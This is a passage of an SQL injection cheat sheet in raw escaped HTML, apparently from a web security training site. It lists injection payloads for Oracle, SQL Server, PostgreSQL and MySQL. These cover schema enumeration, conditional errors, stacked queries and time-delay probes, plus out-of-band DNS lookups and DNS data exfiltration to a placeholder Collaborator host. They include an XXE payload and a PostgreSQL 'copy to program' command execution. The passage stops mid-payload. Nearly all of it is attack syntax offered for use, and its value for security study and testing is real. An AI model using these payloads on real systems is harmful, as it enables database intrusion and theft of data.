id=\"sql_injection\"\u003eSQL_Injection\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#sql_injection\"\u003e\u003c/a\u003e\u003c/h1\u003e\n\u003ch2 id=\"sql-injection-cheat-sheet\"\u003eSQL injection cheat sheet\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#sql-injection-cheat-sheet\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003eThis SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.\u003c/p\u003e\n\u003ch3 id=\"string-concatenation\"\u003eString concatenation\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#string-concatenation\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003eYou can concatenate together multiple strings to make a single string.\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003eOracle\t\u003cspan class=\"token string\"\u003e'foo'\u003c/span\u003e\u003cspan class=\"token operator\"\u003e||\u003c/span\u003e\u003cspan class=\"token string\"\u003e'bar'\u003c/span\u003e\nMicrosoft\t\u003cspan class=\"token string\"\u003e'foo'\u003c/span\u003e\u003cspan class=\"token operator\"\u003e+\u003c/span\u003e\u003cspan class=\"token string\"\u003e'bar'\u003c/span\u003e\nPostgreSQL\t\u003cspan class=\"token string\"\u003e'foo'\u003c/span\u003e\u003cspan class=\"token operator\"\u003e||\u003c/span\u003e\u003cspan class=\"token string\"\u003e'bar'\u003c/span\u003e\nMySQL\t\u003cspan class=\"token string\"\u003e'foo'\u003c/span\u003e \u003cspan class=\"token string\"\u003e'bar'\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003eNote the space \u003cspan class=\"token operator\"\u003ebetween\u003c/span\u003e the two strings\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\nCONCAT\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'foo'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token string\"\u003e'bar'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"substring\"\u003eSubstring\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#substring\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003eYou can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003eOracle\tSUBSTR\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'foobar'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e4\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nMicrosoft\tSUBSTRING\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'foobar'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e4\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nPostgreSQL\tSUBSTRING\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'foobar'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e4\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nMySQL\tSUBSTRING\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'foobar'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e4\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"comments\"\u003eComments\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#comments\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003eYou can use comments to truncate a query and remove the portion of the original query that follows your input.\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003eOracle\t\u003cspan class=\"token comment\"\u003e--comment\u003c/span\u003e\nMicrosoft\t\u003cspan class=\"token comment\"\u003e--comment\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e/*comment*/\u003c/span\u003e\nPostgreSQL\t\u003cspan class=\"token comment\"\u003e--comment\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e/*comment*/\u003c/span\u003e\nMySQL\t\u003cspan class=\"token comment\"\u003e#comment\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e-- comment [Note the space after the double dash]\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e/*comment*/\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"database-version\"\u003eDatabase version\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#database-version\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003eYou can query the database to determine its type and version. This information is useful when formulating more complicated attacks.\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003eOracle\t\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e banner \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e v$version\n\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e version \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e v$instance\nMicrosoft\t\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e @\u003cspan class=\"token variable\"\u003e@version\u003c/span\u003e\nPostgreSQL\t\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e version\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nMySQL\t\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e @\u003cspan class=\"token variable\"\u003e@version\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"database-contents\"\u003eDatabase contents\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#database-contents\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003eYou can list the tables that exist in the database, and the columns that those tables contain.\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003eOracle\t\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e all_tables\n\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e all_tab_columns \u003cspan class=\"token keyword\"\u003eWHERE\u003c/span\u003e table_name \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e'TABLE-NAME-HERE'\u003c/span\u003e\nMicrosoft\t\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e information_schema\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token keyword\"\u003etables\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e information_schema\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token keyword\"\u003ecolumns\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eWHERE\u003c/span\u003e table_name \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e'TABLE-NAME-HERE'\u003c/span\u003e\nPostgreSQL\t\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e information_schema\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token keyword\"\u003etables\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e information_schema\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token keyword\"\u003ecolumns\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eWHERE\u003c/span\u003e table_name \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e'TABLE-NAME-HERE'\u003c/span\u003e\nMySQL\t\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e information_schema\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token keyword\"\u003etables\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e information_schema\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token keyword\"\u003ecolumns\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eWHERE\u003c/span\u003e table_name \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e'TABLE-NAME-HERE'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"conditional-errors\"\u003eConditional errors\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#conditional-errors\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003eYou can test a single boolean condition and trigger a database error if the condition is true.\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003eOracle\t\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eCASE\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eWHEN\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eYOUR\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eCONDITION\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eTHEN\u003c/span\u003e TO_CHAR\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token operator\"\u003e/\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eELSE\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eNULL\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eEND\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e dual\nMicrosoft\t\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eCASE\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eWHEN\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eYOUR\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eCONDITION\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eTHEN\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token operator\"\u003e/\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eELSE\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eNULL\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eEND\u003c/span\u003e\nPostgreSQL\t\u003cspan class=\"token number\"\u003e1\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eCASE\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eWHEN\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eYOUR\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eCONDITION\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eTHEN\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token operator\"\u003e/\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eELSE\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eNULL\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eEND\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nMySQL\t\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eIF\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eYOUR\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eCONDITION\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e table_name \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e information_schema\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token keyword\"\u003etables\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token string\"\u003e'a'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"batched-or-stacked-queries\"\u003eBatched (or stacked) queries\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#batched-or-stacked-queries\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003eYou can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003eOracle\tDoes \u003cspan class=\"token operator\"\u003enot\u003c/span\u003e support batched queries\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\nMicrosoft\tQUERY\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e QUERY\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE\nPostgreSQL\tQUERY\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e QUERY\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE\nMySQL\tQUERY\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e QUERY\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003eNote\nWith MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 id=\"time-delays\"\u003eTime delays\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#time-delays\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003eYou can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003eOracle\tdbms_pipe\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ereceive_message\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'a'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token number\"\u003e10\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nMicrosoft\t\u003cspan class=\"token keyword\"\u003eWAITFOR\u003c/span\u003e DELAY \u003cspan class=\"token string\"\u003e'0:0:10'\u003c/span\u003e\nPostgreSQL\t\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e pg_sleep\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e10\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nMySQL\t\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e SLEEP\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e10\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"conditional-time-delays\"\u003eConditional time delays\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#conditional-time-delays\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003eYou can test a single boolean condition and trigger a time delay if the condition is true.\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003eOracle\t\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eCASE\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eWHEN\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eYOUR\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eCONDITION\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eTHEN\u003c/span\u003e \u003cspan class=\"token string\"\u003e'a'\u003c/span\u003e\u003cspan class=\"token operator\"\u003e||\u003c/span\u003edbms_pipe\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ereceive_message\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'a'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token number\"\u003e10\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eELSE\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eNULL\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eEND\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e dual\nMicrosoft\t\u003cspan class=\"token keyword\"\u003eIF\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eYOUR\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eCONDITION\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eWAITFOR\u003c/span\u003e DELAY \u003cspan class=\"token string\"\u003e'0:0:10'\u003c/span\u003e\nPostgreSQL\t\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eCASE\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eWHEN\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eYOUR\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eCONDITION\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eTHEN\u003c/span\u003e pg_sleep\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e10\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eELSE\u003c/span\u003e pg_sleep\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eEND\u003c/span\u003e\nMySQL\t\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eIF\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eYOUR\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eCONDITION\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003eSLEEP\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e10\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token string\"\u003e'a'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"dns-lookup\"\u003eDNS lookup\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#dns-lookup\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003eYou can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.\u003c/p\u003e\n\u003cp\u003eOracle\tThe following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003e\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e EXTRACTVALUE\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003exmltype\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'\u0026#x3C;?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u0026#x3C;!DOCTYPE root [ \u0026#x3C;!ENTITY % remote SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN/\"\u003e %remote;]\u003e'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token string\"\u003e'/l'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e dual\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe following technique works on fully patched Oracle installations, but requires elevated privileges:\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003e\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e UTL_INADDR\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eget_host_address\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'BURP-COLLABORATOR-SUBDOMAIN'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nMicrosoft\t\u003cspan class=\"token keyword\"\u003eexec\u003c/span\u003e master\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003exp_dirtree \u003cspan class=\"token string\"\u003e'//BURP-COLLABORATOR-SUBDOMAIN/a'\u003c/span\u003e\nPostgreSQL\tcopy \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token string\"\u003e''\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eto\u003c/span\u003e program \u003cspan class=\"token string\"\u003e'nslookup BURP-COLLABORATOR-SUBDOMAIN'\u003c/span\u003e\nMySQL\tThe \u003cspan class=\"token keyword\"\u003efollowing\u003c/span\u003e techniques \u003cspan class=\"token keyword\"\u003ework\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eon\u003c/span\u003e Windows only:\nLOAD_FILE\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eINTO\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eOUTFILE\u003c/span\u003e \u003cspan class=\"token string\"\u003e'\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"dns-lookup-with-data-exfiltration\"\u003eDNS lookup with data exfiltration\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#dns-lookup-with-data-exfiltration\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003eYou can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003eOracle\t\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e EXTRACTVALUE\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003exmltype\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'\u0026#x3C;?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u0026#x3C;!DOCTYPE root [ \u0026#x3C;!ENTITY % remote SYSTEM \"http://'\u003c/span\u003e\u003cspan class=\"token operator\"\u003e||\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e YOUR\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eQUERY\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token operator\"\u003e||\u003c/span\u003e\u003cspan class=\"token string\"\u003e'.BURP-COLLABORATOR-SUBDOMAIN/\"\u003e %remote;]\u003e'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token string\"\u003e'/l'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token 